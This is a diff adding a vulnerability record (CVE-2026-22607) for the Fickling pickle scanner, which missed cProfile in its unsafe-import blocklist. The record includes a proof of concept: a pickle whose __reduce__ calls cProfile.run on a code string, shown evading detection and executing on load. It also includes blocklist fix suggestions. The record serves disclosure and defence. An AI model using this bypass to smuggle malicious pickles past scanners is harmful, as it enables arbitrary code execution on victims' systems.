@@ -1,0 +1,300 @@
+vulnerability_id: VCID-hd7a-k3n4-yygx
+aliases:
+  - CVE-2026-22607
+  - GHSA-p523-jq9w-64x9
+summary: |
+  Fickling Blocklist Bypass: cProfile.run()
+  # Fickling's assessment
+
+  `cProfile` was added to the list of unsafe imports (https://github.com/trailofbits/fickling/commit/dc8ae12966edee27a78fe05c5745171a2b138d43).
+
+  # Original report
+
+  ## Description
+
+  ### Summary
+
+  Fickling versions up to and including 0.1.6 do not treat Python's `cProfile` module as unsafe. Because of this, a malicious pickle that uses `cProfile.run()` is classified as SUSPICIOUS instead of OVERTLY_MALICIOUS.
+
+  If a user relies on Fickling's output to decide whether a pickle is safe to deserialize, this misclassification can lead them to execute attacker-controlled code on their system.
+
+  This affects any workflow or product that uses Fickling as a security gate for pickle deserialization.
+
+  ### Details
+
+  The `cProfile` module is missing from fickling's block list of unsafe module imports in `fickling/analysis.py`. This is the same root cause as CVE-2025-67748 (pty) and CVE-2025-67747 (marshal/types).
+
+  Incriminated source code:
+
+  - File: `fickling/analysis.py`
+  - Class: `UnsafeImports`
+  - Issue: The blocklist does not include `cProfile`, `cProfile.run`, or `cProfile.runctx`
+
+  Reference to similar fix:
+
+  - PR #187 added `pty` to the blocklist to fix CVE-2025-67748
+  - PR #108 documented the blocklist approach
+  - The same fix pattern should be applied for `cProfile`
+
+  How the bypass works:
+
+  1. Attacker creates a pickle using `cProfile.run()` in `__reduce__`
+  2. `cProfile.run()` accepts a Python code string and executes it directly (C-accelerated version of profile.run)
+  3. Fickling's `UnsafeImports` analysis does not flag `cProfile` as dangerous
+  4. Only the `UnusedVariables` heuristic triggers, resulting in SUSPICIOUS severity
+  5. The pickle should be rated OVERTLY_MALICIOUS like `os.system`, `eval`, and `exec`
+
+  Tested behavior (fickling 0.1.6):
+
+  | Function | Fickling Severity | RCE Capable |
+  |----------|-------------------|-------------|
+  | os.system | LIKELY_OVERTLY_MALICIOUS | Yes |
+  | eval | OVERTLY_MALICIOUS | Yes |
+  | exec | OVERTLY_MALICIOUS | Yes |
+  | cProfile.run | SUSPICIOUS | Yes ← BYPASS |
+  | cProfile.runctx | SUSPICIOUS | Yes ← BYPASS |
+
+  Suggested fix:
+
+  Add to the unsafe imports blocklist in `fickling/analysis.py`:
+  - `cProfile`
+  - `cProfile.run`
+  - `cProfile.runctx`
+  - `_lsprof` (underlying C module)
+
+  ## PoC
+
+  Complete instructions, including specific configuration details, to reproduce the vulnerability.
+
+  Environment:
+  - Python 3.13.2
+  - fickling 0.1.6 (latest version, installed via pip)
+
+  ### Step 1: Create malicious pickle
+
+  ```python
+  import pickle
+  import cProfile
+
+  class MaliciousPayload:
+      def __reduce__(self):
+          return (cProfile.run, ("print('CPROFILE_RCE_CONFIRMED')",))
+
+  with open("malicious.pkl", "wb") as f:
+      pickle.dump(MaliciousPayload(), f)
+  ```
+
+  ### Step 2: Analyze with fickling
+
+  ```python
+  from fickling.fickle import Pickled
+  from fickling.analysis import check_safety
+
+  with open('malicious.pkl', 'rb') as f:
+      data = f.read()
+
+  pickled = Pickled.load(data)
+  result = check_safety(pickled)
+  print(f"Severity: {result.severity}")
+  print(f"Analysis: {result}")
+  ```
+
+  Expected output (if properly detected):
+  ```
+  Severity: Severity.OVERTLY_MALICIOUS
+  ```
+
+  Actual output (bypass confirmed):
+  ```
+  Severity: Severity.SUSPICIOUS
+  Analysis: Variable `_var0` is assigned value `run(...)` but unused afterward; this is suspicious and indicative of a malicious pickle file
+  ```
+
+  ### Step 3: Prove RCE by loading the pickle
+
+  ```bash
+  python -c "import pickle; pickle.load(open('malicious.pkl', 'rb'))"
+  ```
+
+  Output
+  ```
+  CPROFILE_RCE_CONFIRMED
+           4 function calls in 0.000 seconds
+
+     Ordered by: standard name
+
+     ncalls  tottime  percall  cumtime  percall filename:lineno(function)
+          1    0.000    0.000    0.000    0.000 <string>:1(<module>)
+          1    0.000    0.000    0.000    0.000 {built-in method builtins.exec}
+          1    0.000    0.000    0.000    0.000 {built-in method builtins.print}
+          1    0.000    0.000    0.000    0.000 {method 'disable' of '_lsprof.Profiler' objects}
+  ```
+
+  Check: The code executes, proving RCE.
+
+  ### Pickle disassembly (evidence):
+
+  ```
+      0: \x80 PROTO      5
+      2: \x95 FRAME      58
+     11: \x8c SHORT_BINUNICODE 'cProfile'
+     21: \x94 MEMOIZE    (as 0)
+     22: \x8c SHORT_BINUNICODE 'run'
+     27: \x94 MEMOIZE    (as 1)
+     28: \x93 STACK_GLOBAL
+     29: \x94 MEMOIZE    (as 2)
+     30: \x8c SHORT_BINUNICODE "print('CPROFILE_RCE_CONFIRMED')"
+     63: \x94 MEMOIZE    (as 3)
+     64: \x85 TUPLE1
+     65: \x94 MEMOIZE    (as 4)
+     66: R    REDUCE
+     67: \x94 MEMOIZE    (as 5)
+     68: .    STOP
+  highest protocol among opcodes = 4
+  ```
+
+  ## Impact
+
+  Vulnerability Type:
+
+  Incomplete blocklist leading to safety check bypass (CWE-184) and arbitrary code execution via insecure deserialization (CWE-502).
+
+  Who is impacted:
+
+  Any user or system that relies on fickling to vet pickle files for security issues before loading them. This includes:
+  - ML model validation pipelines
+  - Model hosting platforms (Hugging Face, MLflow, etc.)
+  - Security scanning tools that use fickling
+  - CI/CD pipelines that validate pickle artifacts
+
+  Attack scenario:
+
+  An attacker uploads a malicious ML model or pickle file to a model repository. The victim's pipeline uses fickling to scan uploads. Fickling rates the file as "SUSPICIOUS" (not "OVERTLY_MALICIOUS"), so the file is not rejected. When the victim loads the model, arbitrary code executes on their system.
+
+  Why cProfile.run() is dangerous:
+
+  Unlike `runpy.run_path()` which requires a file on disk, `cProfile.run()` takes a code string directly. This means the entire attack is self-contained in the pickle - no external files needed. Python docs explicitly state that `cProfile.run()` takes "a single argument that can be passed to the exec() function".
+
+  `cProfile` is the C-accelerated version and is more commonly available than `profile`. It's also the recommended profiler per Python docs ("cProfile is recommended for most users"), so it's present in virtually all Python installations.
+
+  Severity: HIGH
+
+  - The attacker achieves arbitrary code execution
+  - The security control (fickling) is specifically designed to prevent this
+  - The bypass requires no special conditions beyond crafting the pickle with cProfile
+  - Attack is fully self-contained (no external files needed)
+  - cProfile is more commonly used than profile, increasing attack surface
+severities:
+  - score: '0.00068'
+    scoring_system: epss
+    scoring_elements: '0.21279'
+    published_at: '2026-01-11 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2026-22607
+  - score: HIGH
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/advisories/GHSA-p523-jq9w-64x9
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/trailofbits/fickling
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/trailofbits/fickling/blob/977b0769c13537cd96549c12bb537f05464cf09c/test/test_bypasses.py#L116
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/trailofbits/fickling/commit/dc8ae12966edee27a78fe05c5745171a2b138d43
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/trailofbits/fickling/pull/108
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/trailofbits/fickling/pull/187
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/trailofbits/fickling/pull/195
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/trailofbits/fickling/releases/tag/v0.1.7
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/trailofbits/fickling/security/advisories/GHSA-565g-hwwr-4pp3
+  - score: HIGH
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/trailofbits/fickling/security/advisories/GHSA-p523-jq9w-64x9
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/trailofbits/fickling/security/advisories/GHSA-p523-jq9w-64x9
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/trailofbits/fickling/security/advisories/GHSA-r7v6-mfhq-g3m2
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2026-22607
+weaknesses:
+  - CWE-502
+  - CWE-184
+references:
+  - url: https://api.first.org/data/v1/epss?cve=CVE-2026-22607
+    reference_type:
+    reference_id:
+  - url: https://github.com/trailofbits/fickling
+    reference_type:
+    reference_id:
+  - url: https://github.com/trailofbits/fickling/blob/977b0769c13537cd96549c12bb537f05464cf09c/test/test_bypasses.py#L116
+    reference_type:
+    reference_id:
+  - url: https://github.com/trailofbits/fickling/commit/dc8ae12966edee27a78fe05c5745171a2b138d43
+    reference_type:
+    reference_id:
+  - url: https://github.com/trailofbits/fickling/pull/108
+    reference_type:
+    reference_id:
+  - url: https://github.com/trailofbits/fickling/pull/187
+    reference_type:
+    reference_id:
+  - url: https://github.com/trailofbits/fickling/pull/195
+    reference_type:
+    reference_id:
+  - url: https://github.com/trailofbits/fickling/releases/tag/v0.1.7
+    reference_type:
+    reference_id:
+  - url: https://github.com/trailofbits/fickling/security/advisories/GHSA-565g-hwwr-4pp3
+    reference_type:
+    reference_id:
+  - url: https://github.com/trailofbits/fickling/security/advisories/GHSA-p523-jq9w-64x9
+    reference_type:
+    reference_id:
+  - url: https://github.com/trailofbits/fickling/security/advisories/GHSA-r7v6-mfhq-g3m2
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-22607
+    reference_type:
+    reference_id: CVE-2026-22607
+  - url: https://github.com/advisories/GHSA-p523-jq9w-64x9
+    reference_type:
+    reference_id: GHSA-p523-jq9w-64x9
